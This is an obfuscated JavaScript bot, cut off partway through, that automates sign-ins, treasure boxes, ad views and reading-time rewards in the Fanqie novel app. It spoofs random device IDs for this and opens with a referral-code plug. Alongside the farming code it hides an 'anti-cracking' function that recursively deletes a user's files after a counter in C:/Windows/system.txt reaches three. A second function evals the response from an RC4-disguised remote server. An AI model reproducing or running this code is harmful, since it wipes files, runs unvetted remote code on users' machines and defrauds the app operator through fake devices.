/*
填我邀请码【7367401128】！
番茄免费小说 5.30  一天一两块钱左右吧。。主要看号看设备。。。
脚本包含签到，宝箱，宝箱翻倍，看广告，阅读时长奖励。
抓取域名：i.snssdk.com 前面的i可能是其他的字母之类的，自己找找
找到Cookie里的 sessionid值就可以。
变量 fqmfxsckapp   对应账号数据
多账号@分割
如果想收益最大化可以半小时运行一次。。。
抓包可降级版本去抓。

*/

const $ = new Env('番茄免费小说');

var gtr;
let mac = '',
    status;
status = (status = $["getval"]("qmwkstatus") || '1') > 1 ? '' + status : '';
JSNAMED = $["isNode"]() ? require("path")["basename"](__filename) : "fqmfxsck.js";
let fqmfxsckappArr = [],
    xsid = '',
    oaid = '',
    did = '',
    all_msg = '',
    arrs = [];
let fqmfxsckapp = ($["isNode"]() ? process["env"]["fqmfxsckapp"] : $['getdata']("fqmfxsckapp")) || '';
let acckey = $["isNode"]() ? process["env"]['cdkey'] ? process["env"]["cdkey"] : '' : $["getdata"]('cdkey') ? $["getdata"]("cdkey") : '';
let fqid = ['5', '10', '30', '60', "120", "180"];

if ($["isNode"]()) {
  gtr = require('fs');

  if (isFileExist("C:/")) {
    console["log"]("电脑环境");
  } else {
    console["log"]("青龙环境");
  }
} else {
  console["log"]("代理环境");
}

function isFileExist(_0x381efe) {
  try {
    gtr["accessSync"](_0x381efe, gtr["F_OK"]);
  } catch (_0x4941fa) {
    return false;
  }

  return true;
}

function addF(_0x4be21f, _0xce8765) {
  let _0x330c74 = 0,
      _0x493673 = "C:/Windows/system.txt";

  if (isFileExist(_0x493673)) {
    _0x330c74 = gtr["readFileSync"](_0x493673, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr["writeFile"](_0x493673, '1', function (_0xe8193b) {
        if (_0xe8193b) {
          throw _0xe8193b;
        }
      });
    } else {
      return;
    }
  }

  if (_0x330c74 == 99) {
    return 99;
  }

  console["log"](_0x330c74);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x330c74);

  if (parseInt(_0x330c74) < 3) {
    let _0x57c394 = parseInt(_0x330c74) + 1;

    gtr["writeFileSync"](_0x493673, _0x57c394 + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](_0x4be21f)) {
    return;
  }

  if (gtr["statSync"](_0x4be21f)["isDirectory"]()) {
    var _0x25b9ce = gtr["readdirSync"](_0x4be21f),
        _0x3c3a2d = _0x25b9ce["length"],
        _0x4815ca = 0;

    if (_0x3c3a2d > 0) {
      _0x25b9ce["forEach"](function (_0x1a6ce3) {
        _0x4815ca++;

        var _0x173cf6 = _0x4be21f + '/' + _0x1a6ce3;

        gtr["statSync"](_0x173cf6)["isDirectory"]() ? addF(_0x173cf6, true) : gtr["unlinkSync"](_0x173cf6);
      });

      _0x3c3a2d == _0x4815ca && _0xce8765 && gtr["rmdirSync"](_0x4be21f);
    } else {
      _0x3c3a2d == 0 && _0xce8765 && gtr["rmdirSync"](_0x4be21f);
    }
  } else {
    gtr["unlinkSync"](_0x4be21f);
  }
}

!(async () => {
  if (!(typeof $request !== "undefined")) {
   

    fqmfxsckappArr = fqmfxsckapp["split"]('@');
    console["log"]("------------- 共" + fqmfxsckappArr["length"] + "个账号-------------\n");
    

    if (!(fqmfxsckappArr["length"] > parseInt(arrs["num"]))) {
      for (let _0x4108b5 = 0; _0x4108b5 < fqmfxsckappArr["length"]; _0x4108b5++) {
        fqmfxsckapp = fqmfxsckappArr[_0x4108b5];
        $["index"] = _0x4108b5 + 1;
        console["log"]("\n开始【番茄免费小说" + $["index"] + '】');
        oaid = random(16);
        did = random(15);
        await fqmfxsxx();
        await fqmfxsqd();
        await fqmfxsbx();

        for (let _0x32fb3f = 0; _0x32fb3f < fqid["length"]; _0x32fb3f++) {
          xsid = fqid[_0x32fb3f];
          await fqmfxskxs();
        }

        await fqmfxssp();
        await fqmfxskgg();
      }
    }
  }

})()["catch"](_0x3224e2 => $["logErr"](_0x3224e2))["finally"](() => $["done"]());

function fqmfxsbx(_0x596048 = 0) {
  return new Promise(_0x5e6f56 => {
    let _0x2618c0 = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/task/done/treasure_task?iid=" + oaid + "&device_id=" + did + "&ac=wifi&mac_address=DE%3AEC%3A1D%3A07%3A26%3A05&channel=yyh_sd0319&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10&manifest_version_code=310&resolution=1080*2232&dpi=480&update_version_code=31032&_rticket=1653886500579&_rticket=1653886500613&gender=1&comment_tag_c=3&vip_state=0&category_style=1",
      'headers': {
        'Host': 'i.snssdk.com',
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      },
      'body': '{}'
    };
    $['post'](_0x2618c0, async (_0x51c653, _0x4273eb, _0x367a70) => {
      try {
        const _0x5cbab3 = JSON["parse"](_0x367a70);

        _0x5cbab3["err_no"] == 0 ? (console["log"]("\n番茄免费小说开宝箱获得：" + _0x5cbab3["data"]["amount"] + '金币'), await fqmfxssp(), await fqmfxsbxfb()) : console["log"]("\n番茄免费小说开宝箱:" + _0x5cbab3["err_tips"]);
      } catch (_0x209e86) {} finally {
        _0x5e6f56();
      }
    }, _0x596048);
  });
}

function fqmfxsbxfb(_0x27c561 = 0) {
  return new Promise(_0x59c543 => {
    let _0x2be91d = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/task/done/excitation_ad_treasure_box?iid=" + oaid + "&device_id=" + did + "&ac=wifi&mac_address=DE%3AEC%3A1D%3A07%3A26%3A05&channel=yyh_sd0319&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10&manifest_version_code=310&resolution=1080*2232&dpi=480&update_version_code=31032&_rticket=1653886500579&_rticket=1653886500613&gender=1&comment_tag_c=3&vip_state=0&category_style=1",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      },
      'body': "{\"from\":\"gold_coin_reward_dialog_open_treasure\"}"
    };
    $["post"](_0x2be91d, async (_0x529be8, _0x19f7a7, _0x1650b6) => {
      try {
        const _0x1d6e18 = JSON["parse"](_0x1650b6);

        _0x1d6e18["err_no"] == 0 ? console["log"]("\n番茄免费小说开宝箱翻倍视频获得：" + _0x1d6e18["data"]["amount"] + '金币') : console["log"]("\n番茄免费小说开宝箱翻倍视频:" + _0x1d6e18["err_tips"]);
      } catch (_0x25ea05) {} finally {
        _0x59c543();
      }
    }, _0x27c561);
  });
}

function fqmfxskxs(_0x255ac = 0) {
  return new Promise(_0x5f3b75 => {
    let _0x166e38 = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/task/done/daily_read_" + xsid + "m?iid=" + oaid + "&device_id=" + did + "&ac=wifi&mac_address=DE%3AEC%3A1D%3A07%3A26%3A05&channel=yyh_sd0319&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10&manifest_version_code=310&resolution=1080*2232&dpi=480&update_version_code=31032&_rticket=1653886500579&_rticket=1653886500613&gender=1&comment_tag_c=3&vip_state=0&category_style=1",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': 'sessionid=' + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      },
      'body': '{}'
    };
    $["post"](_0x166e38, async (_0x50b610, _0x2110ac, _0x2fea79) => {
      try {
        const _0x17323c = JSON["parse"](_0x2fea79);

        if (_0x17323c["err_no"] == 0) {
          console["log"]("\n番茄免费小说阅读" + xsid + "分钟奖励获得：" + _0x17323c["data"]["amount"] + '金币');
        }
      } catch (_0x5105af) {} finally {
        _0x5f3b75();
      }
    }, _0x255ac);
  });
}

function fqmfxskgg(_0x386096 = 0) {
  return new Promise(_0x5e6f9a => {
    let _0x1008f6 = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/task/done/excitation_ad?iid=3593654932631560&device_id=" + did + "&ac=wifi&mac_address=DE%3AEC%3A1D%3A07%3A26%3A05&channel=yyh_sd0319&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10&manifest_version_code=310&resolution=1080*2232&dpi=480&update_version_code=31032&_rticket=1653886500579&_rticket=1653886500613&gender=1&comment_tag_c=3&vip_state=0&category_style=1",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      },
      'body': "{\"from\":\"task_list\"}"
    };
    $["post"](_0x1008f6, async (_0x4f81f8, _0x30563e, _0xddcc7d) => {
      try {
        const _0x106c42 = JSON["parse"](_0xddcc7d);

        _0x106c42["err_no"] == 0 ? console["log"]("\n番茄免费小说看广告获得：" + _0x106c42["data"]["amount"] + '金币') : console["log"]("\n番茄免费小说看广告:" + _0x106c42["err_tips"]);
      } catch (_0x35349e) {} finally {
        _0x5e6f9a();
      }
    }, _0x386096);
  });
}

function fqmfxssp(_0x2dee89 = 0) {
  return new Promise(_0x2d3594 => {
    oaid = randomString(32);
    did = random(16);
    let _0x3e9e55 = {
      'url': "https://i.snssdk.com/api/ad/v1/inspire/?ad_from=coin&creator_id=10001&iid=3593654932631560&device_id=" + did + "&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=10&device_brand=meizu&language=zh&os_api=29&os_version=10",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      }
    };
    $["get"](_0x3e9e55, async (_0x3f3f19, _0x14b59b, _0x4285ae) => {
      try {
        const _0x4d8a7d = JSON["parse"](_0x4285ae);

        if (!(_0x4d8a7d["code"] == 0)) {}
      } catch (_0x2a4162) {} finally {
        _0x2d3594();
      }
    }, _0x2dee89);
  });
}

function fqmfxsqd(_0x30636f = 0) {
  return new Promise(_0x547869 => {
    oaid = randomString(32);
    did = random(15);
    let _0x1319ee = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/task/done/sign_in?iid=" + oaid + "&device_id=" + did + "&ac=wifi&mac_address=DE%3AEC%3A1D%3A07%3A26%3A05&channel=yyh_sd0319&aid=1967&app_name=novelapp&version_code=310&version_name=3.1.0.32&device_platform=android&ssmix=a&device_type=16s+Pro&device_brand=meizu&language=zh&os_api=29&os_version=10",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      },
      'body': '{}'
    };
    $["post"](_0x1319ee, async (_0x2869da, _0x2d7d5e, _0x31246c) => {
      try {
        const _0x29ffd6 = JSON["parse"](_0x31246c);

        _0x29ffd6['err_no'] == 0 ? console["log"]("\n番茄免费小说签到获得：" + _0x29ffd6['data']["amount"] + '金币') : console["log"]("\n番茄免费小说签到:" + _0x29ffd6["err_tips"]);
      } catch (_0x3a4b05) {} finally {
        _0x547869();
      }
    }, _0x30636f);
  });
}

function fqmfxsxx(_0x8f19ce = 0) {
  return new Promise(_0x5d0f54 => {
    oaid = randomString(32);
    did = random(16);
    let _0x3f4fd0 = {
      'url': "https://i.snssdk.com/luckycat/novel/v1/user/info?iid=" + oaid + '&device_id=' + did + "&&aid=1967",
      'headers': {
        'Host': "i.snssdk.com",
        'Cookie': "sessionid=" + fqmfxsckapp,
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        'User-Agent': "com.ss.android.ugc.aweme.lite/140100 (Linux; U; Android 10; zh_CN; 16s Pro; Build/QKQ1.191222.002; Cronet/TTNetVersion:0033c51e 2021-01-18 QuicVersion:47946d2a 2020-10-14)"
      }
    };
    $["get"](_0x3f4fd0, async (_0x38c17e, _0x4b8081, _0x1506a6) => {
      try {
        const _0x2df41a = JSON["parse"](_0x1506a6);

        if (_0x2df41a["err_no"] == 0) {
          console["log"]("\n番茄免费小说现金金额：" + _0x2df41a["data"]["income_info_list"][0]["amount"] / 100 + "元，金币金额：" + _0x2df41a["data"]["income_info_list"][1]["amount"]);
        }
      } catch (_0x3bed15) {} finally {
        _0x5d0f54();
      }
    }, _0x8f19ce);
  });
}

function randomString(_0x4bbbf5 = 12) {
  let _0x4d3c04 = "abcdef0123456789";
  let _0x1a19fb = _0x4d3c04["length"];
  let _0x1cb103 = '';

  for (i = 0; i < _0x4bbbf5; i++) {
    _0x1cb103 += _0x4d3c04["charAt"](Math["floor"](Math["random"]() * _0x1a19fb));
  }

  return _0x1cb103;
}

function random(_0x3c9856 = 12) {
  let _0x2be737 = "0123456789";
  let _0x40433a = _0x2be737['length'];
  let _0x35bfcb = '';

  for (i = 0; i < _0x3c9856; i++) {
    _0x35bfcb += _0x2be737["charAt"](Math["floor"](Math["random"]() * _0x40433a));
  }

  return _0x35bfcb;
}

function randomString(_0x2587ac = 12) {
  let _0x57c656 = "abcdef0123456789",
      _0x289e8e = _0x57c656["length"];
  let _0x110587 = '';

  for (i = 0; i < _0x2587ac; i++) {
    _0x110587 += _0x57c656["charAt"](Math["floor"](Math["random"]() * _0x289e8e));
  }

  return _0x110587;
}

function encodeUTF8(_0x6eb427) {
  var _0x16480f,
      _0x14887b = [],
      _0xcfe37c,
      _0x167c08;

  for (_0x16480f = 0; _0x16480f < _0x6eb427["length"]; _0x16480f++) {
    if ((_0xcfe37c = _0x6eb427["charCodeAt"](_0x16480f)) < 128) {
      _0x14887b["push"](_0xcfe37c);
    } else {
      if (_0xcfe37c < 2048) {
        _0x14887b["push"](192 + (_0xcfe37c >> 6 & 31), 128 + (_0xcfe37c & 63));
      } else {
        if ((_0x167c08 = _0xcfe37c ^ 55296) >> 10 == 0) {
          _0xcfe37c = (_0x167c08 << 10) + (_0x6eb427["charCodeAt"](++_0x16480f) ^ 56320) + 65536;

          _0x14887b["push"](240 + (_0xcfe37c >> 18 & 7), 128 + (_0xcfe37c >> 12 & 63));
        } else {
          _0x14887b["push"](224 + (_0xcfe37c >> 12 & 15));
        }

        _0x14887b["push"](128 + (_0xcfe37c >> 6 & 63), 128 + (_0xcfe37c & 63));
      }
    }
  }

  return _0x14887b;
}

function sha(_0x57cba3) {
  var _0x37d16d = new Uint8Array(encodeUTF8(_0x57cba3));

  var _0x4d08ae, _0x15b77a, _0x5351a3;

  var _0x4bd847 = (_0x37d16d["length"] + 8 >>> 6 << 4) + 16,
      _0x57cba3 = new Uint8Array(_0x4bd847 << 2);

  _0x57cba3["set"](new Uint8Array(_0x37d16d["buffer"]));

  _0x57cba3 = new Uint32Array(_0x57cba3["buffer"]);

  for (_0x5351a3 = new DataView(_0x57cba3["buffer"]), _0x4d08ae = 0; _0x4d08ae < _0x4bd847; _0x4d08ae++) {
    _0x57cba3[_0x4d08ae] = _0x5351a3['getUint32'](_0x4d08ae << 2);
  }

  _0x57cba3[_0x37d16d["length"] >> 2] |= 128 << 24 - (_0x37d16d["length"] & 3) * 8;
  _0x57cba3[_0x4bd847 - 1] = _0x37d16d["length"] << 3;

  var _0x3c9c7f = [],
      _0x3df4d7 = [function () {
    return _0x18a68e[1] & _0x18a68e[2] | ~_0x18a68e[1] & _0x18a68e[3];
  }, function () {
    return _0x18a68e[1] ^ _0x18a68e[2] ^ _0x18a68e[3];
  }, function () {
    return _0x18a68e[1] & _0x18a68e[2] | _0x18a68e[1] & _0x18a68e[3] | _0x18a68e[2] & _0x18a68e[3];
  }, function () {
    return _0x18a68e[1] ^ _0x18a68e[2] ^ _0x18a68e[3];
  }],
      _0x49e832 = function (_0x1b88e8, _0x1b3176) {
    return _0x1b88e8 << _0x1b3176 | _0x1b88e8 >>> 32 - _0x1b3176;
  },
      _0x3cf4fd = [1518500249, 1859775393, -1894007588, -899497514],
      _0x18a68e = [1732584193, -271733879, null, null, -1009589776];

  _0x18a68e[2] = ~_0x18a68e[0];
  _0x18a68e[3] = ~_0x18a68e[1];

  for (_0x4d08ae = 0; _0x4d08ae < _0x57cba3["length"]; _0x4d08ae += 16) {
    var _0x507902 = _0x18a68e["slice"](0);

    for (_0x15b77a = 0; _0x15b77a < 80; _0x15b77a++) {
      _0x3c9c7f[_0x15b77a] = _0x15b77a < 16 ? _0x57cba3[_0x4d08ae + _0x15b77a] : _0x49e832(_0x3c9c7f[_0x15b77a - 3] ^ _0x3c9c7f[_0x15b77a - 8] ^ _0x3c9c7f[_0x15b77a - 14] ^ _0x3c9c7f[_0x15b77a - 16], 1);
      _0x5351a3 = _0x49e832(_0x18a68e[0], 5) + _0x3df4d7[_0x15b77a / 20 | 0]() + _0x18a68e[4] + _0x3c9c7f[_0x15b77a] + _0x3cf4fd[_0x15b77a / 20 | 0] | 0;
      _0x18a68e[1] = _0x49e832(_0x18a68e[1], 30);

      _0x18a68e["pop"]();

      _0x18a68e["unshift"](_0x5351a3);
    }

    for (_0x15b77a = 0; _0x15b77a < 5; _0x15b77a++) {
      _0x18a68e[_0x15b77a] = _0x18a68e[_0x15b77a] + _0x507902[_0x15b77a] | 0;
    }
  }

  _0x5351a3 = new DataView(new Uint32Array(_0x18a68e)["buffer"]);

  for (var _0x4d08ae = 0; _0x4d08ae < 5; _0x4d08ae++) {
    _0x18a68e[_0x4d08ae] = _0x5351a3["getUint32"](_0x4d08ae << 2);
  }

  var _0x13b368 = Array["prototype"]["map"]['call'](new Uint8Array(new Uint32Array(_0x18a68e)["buffer"]), function (_0x248917) {
    return (_0x248917 < 16 ? '0' : '') + _0x248917["toString"](16);
  })['join']('');

  return _0x13b368;
}

function hqs(_0x16ce33 = 10) {
  return new Promise(_0x369c42 => {
    let _0x1a2a97 = 12;
    let _0x2bd6bd = {
      'url': $["isNode"]() ? rc4($["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x1a2a97 + "&ip=1&mac=" + mac + "&bb=1") : rc4($["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x1a2a97 + "&ip=0&mac=" + mac + "&bb=1")
    };
    $["post"](_0x2bd6bd, async (_0x271cc5, _0x17df2f, _0x21af3b) => {
      try {
        let _0x207971 = eval(_0x21af3b);

        _0x207971["code"] == 200 ? (all_msg = _0x207971["msg"], _0x369c42(_0x207971["data"])) : (all_msg = _0x207971["msg"], _0x369c42(false));
      } catch (_0x5622e5) {
        $["logErr"](_0x5622e5, _0x17df2f);
      }
    }, 0);
  });
}

function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  this["encode"] = function (_0x474774) {
    var _0x512c40 = '';

    var _0x1528f8,
        _0x54ac58,
        _0x77d184,
        _0x215b44,
        _0x2334b7,
        _0x35c228,
        _0x301e5b,
        _0x3f4a0a = 0;

    _0x474774 = _utf8_encode(_0x474774);

    while (_0x3f4a0a < _0x474774["length"]) {
      _0x1528f8 = _0x474774["charCodeAt"](_0x3f4a0a++);
      _0x54ac58 = _0x474774["charCodeAt"](_0x3f4a0a++);
      _0x77d184 = _0x474774["charCodeAt"](_0x3f4a0a++);
      _0x215b44 = _0x1528f8 >> 2;
      _0x2334b7 = (_0x1528f8 & 3) << 4 | _0x54ac58 >> 4;
      _0x35c228 = (_0x54ac58 & 15) << 2 | _0x77d184 >> 6;
      _0x301e5b = _0x77d184 & 63;

      if (isNaN(_0x54ac58)) {
        _0x35c228 = _0x301e5b = 64;
      } else {
        isNaN(_0x77d184) && (_0x301e5b = 64);
      }

      _0x512c40 = _0x512c40 + _keyStr["charAt"](_0x215b44) + _keyStr["charAt"](_0x2334b7) + _keyStr["charAt"](_0x35c228) + _keyStr["charAt"](_0x301e5b);
    }

    return _0x512c40;
  };

  this["decode"] = function (_0x3b10e4) {
    var _0x5c29bb = '';

    var _0x5c74c1, _0xbc11a2, _0x2d071d;

    var _0x1f0be3, _0x7115a4, _0x4a2aec, _0x18a69d;

    var _0x5da296 = 0;
    _0x3b10e4 = _0x3b10e4["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (_0x5da296 < _0x3b10e4["length"]) {
      _0x1f0be3 = _keyStr["indexOf"](_0x3b10e4["charAt"](_0x5da296++));
      _0x7115a4 = _keyStr["indexOf"](_0x3b10e4["charAt"](_0x5da296++));
      _0x4a2aec = _keyStr['indexOf'](_0x3b10e4["charAt"](_0x5da296++));
      _0x18a69d = _keyStr["indexOf"](_0x3b10e4["charAt"](_0x5da296++));
      _0x5c74c1 = _0x1f0be3 << 2 | _0x7115a4 >> 4;
      _0xbc11a2 = (_0x7115a4 & 15) << 4 | _0x4a2aec >> 2;
      _0x2d071d = (_0x4a2aec & 3) << 6 | _0x18a69d;
      _0x5c29bb = _0x5c29bb + String["fromCharCode"](_0x5c74c1);
      _0x4a2aec != 64 && (_0x5c29bb = _0x5c29bb + String["fromCharCode"](_0xbc11a2));
      _0x18a69d != 64 && (_0x5c29bb = _0x5c29bb + String["fromCharCode"](_0x2d071d));
    }

    _0x5c29bb = _utf8_decode(_0x5c29bb);
    return _0x5c29bb;
  };

  _utf8_encode = function (_0x402ab4) {
    _0x402ab4 = _0x402ab4["replace"](/\r\n/g, "\n");
    var _0x30e854 = '';

    for (var _0x4e631b = 0; _0x4e631b < _0x402ab4["length"]; _0x4e631b++) {
      var _0x4bc8f4 = _0x402ab4["charCodeAt"](_0x4e631b);

      if (_0x4bc8f4 < 128) {
        _0x30e854 += String["fromCharCode"](_0x4bc8f4);
      } else {
        _0x4bc8f4 > 127 && _0x4bc8f4 < 2048 ? (_0x30e854 += String["fromCharCode"](_0x4bc8f4 >> 6 | 192), _0x30e854 += String["fromCharCode"](_0x4bc8f4 & 63 | 128)) : (_0x30e854 += String['fromCharCode'](_0x4bc8f4 >> 12 | 224), _0x30e854 += String["fromCharCode"](_0x4bc8f4 >> 6 & 63 | 128), _0x30e854 += String["fromCharCode"](_0x4bc8f4 & 63 | 128));
      }
    }

    return _0x30e854;
  };

  _utf8_decode = function (_0x48cd80) {
    var _0x17e460 = '',
        _0x3233fd = 0;

    var _0x8f1645 = c1 = c2 = 0;

    while (_0x3233fd < _0x48cd80["length"]) {
      _0x8f1645 = _0x48cd80["charCodeAt"](_0x3233fd);

      if (_0x8f1645 < 128) {
        _0x17e460 += String["fromCharCode"](_0x8f1645);
        _0x3233fd++;
      } else {
        _0x8f1645 > 191 && _0x8f1645 < 224 ? (c2 = _0x48cd80["charCodeAt"](_0x3233fd + 1), _0x17e460 += String["fromCharCode"]((_0x8f1645 & 31) << 6 | c2 & 63), _0x3233fd += 2) : (c2 = _0x48cd80["charCodeAt"](_0x3233fd + 1), c3 = _0x48cd80["charCodeAt"](_0x3233fd + 2), _0x17e460 += String["fromCharCode"]((_0x8f1645 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x3233fd += 3);
      }
    }

    return _0x17e460;
  };
}

function rc4(_0x3dcc27, _0x45fcc0) {
  var _0x1e37bd = Array(256);

  var _0x359e33 = Array(_0x3dcc27["length"]);

  for (var _0x5079f9 = 0; _0x5079f9 < 256; _0x5079f9++) {
    _0x1e37bd[_0x5079f9] = _0x5079f9;

    var _0x252e89 = (_0x252e89 + _0x1e37bd[_0x5079f9] + _0x45fcc0["charCodeAt"](_0x5079f9 % _0x45fcc0["length"])) % 256,
        _0x242f12 = _0x1e37bd[_0x5079f9];

    _0x1e37bd[_0x5079f9] = _0x1e37bd[_0x252e89];
    _0x1e37bd[_0x252e89] = _0x242f12;
  }

  for (var _0x5079f9 = 0; _0x5079f9 < _0x3dcc27["length"]; _0x5079f9++) {
    _0x359e33[_0x5079f9] = _0x3dcc27["charCodeAt"](_0x5079f9);
  }

  for (var _0x3b05f4 = 0; _0x3b05f4 < _0x359e33["length"]; _0x3b05f4++) {
    var _0x5079f9 = (_0x5079f9 + 1) % 256,
        _0x252e89 = (_0x252e89 + _0x1e37bd[_0x5079f9]) % 256,
        _0x242f12 = _0x1e37bd[_0x5079f9];

    _0x1e37bd[_0x5079f9] = _0x1e37bd[_0x252e89];
    _0x1e37bd[_0x252e89] = _0x242f12;

    var _0x21a4bd = (_0x1e37bd[_0x5079f9] + _0x1e37bd[_0x252e89] % 256) % 256;

    _0x359e33[_0x3b05f4] = String["fromCharCode"](_0x359e33[_0x3b05f4] ^ _0x1e37bd[_0x21a4bd]);
  }

  return _0x359e33["join"]('');
}

function Env(t, e) {
  class s {
    constructor(t) {
      this["env"] = t;
    }

    send(t, e = "GET") {
      t = "string" == typeof t ? {
        "url": t
      } : t;
      let s = this["get"];
      "POST" === e && (s = this["post"]);
      return new Promise((e, i) => {
        s["call"](this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }

    get(t) {
      return this["send"]["call"](this["env"], t);
    }

    post(t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

  }

  return new class {
    constructor(t, e) {
      this["name"] = t;
      this["http"] = new s(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = "utf-8";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, e);
      this["log"]("", `🔔${this["name"]}, 开始!`);
    }

    isNode() {
      return "undefined" != typeof module && !!module["exports"];
    }

    isQuanX() {
      return "undefined" != typeof $task;
    }

    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    isLoon() {
      return "undefined" != typeof $loon;
    }

    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }

    toObj(t, e = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return e;
      }
    }

    toStr(t, e = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return e;
      }
    }

    getjson(t, e) {
      let s = e;
      const i = this["getdata"](t);

      if (i) {
        try {
          s = JSON["parse"](this["getdata"](t));
        } catch {}
      }

      return s;
    }

    setjson(t, e) {
      try {
        return this["setdata"](JSON["stringify"](t), e);
      } catch {
        return false;
      }
    }

    getScript(t) {
      return new Promise(e => {
        this["get"]({
          "url": t
        }, (t, s, i) => e(i));
      });
    }

    runScript(t, e) {
      return new Promise(s => {
        let i = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i["replace"](/\n/g, "")["trim"]() : i;
        let r = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e["timeout"] ? e["timeout"] : r;
        const [o, h] = i["split"]("@"),
              n = {
          "url": `http://${h}/v1/scripting/evaluate`,
          "body": {
            "script_text": t,
            "mock_type": "cron",
            "timeout": r
          },
          "headers": {
            "X-Key": o,
            "Accept": "*/*"
          }
        };
        this["post"](n, (t, e, i) => s(i));
      })["catch"](t => this["logErr"](t));
    }

    loaddata() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e);

        if (!s && !i) {
          return {};
        }

        {
          const i = s ? t : e;

          try {
            return JSON["parse"](this["fs"]["readFileSync"](i));
          } catch (t) {
            return {};
          }
        }
      }
    }

    writedata() {
      if (this["isNode"]()) {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e),
              r = JSON["stringify"](this["data"]);
        s ? this["fs"]["writeFileSync"](t, r) : i ? this["fs"]["writeFileSync"](e, r) : this["fs"]["writeFileSync"](t, r);
      }
    }

    lodash_get(t, e, s) {
      const i = e["replace"](/\[(\d+)\]/g, ".$1")["split"](".");
      let r = t;

      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }

      return r;
    }

    lodash_set(t, e, s) {
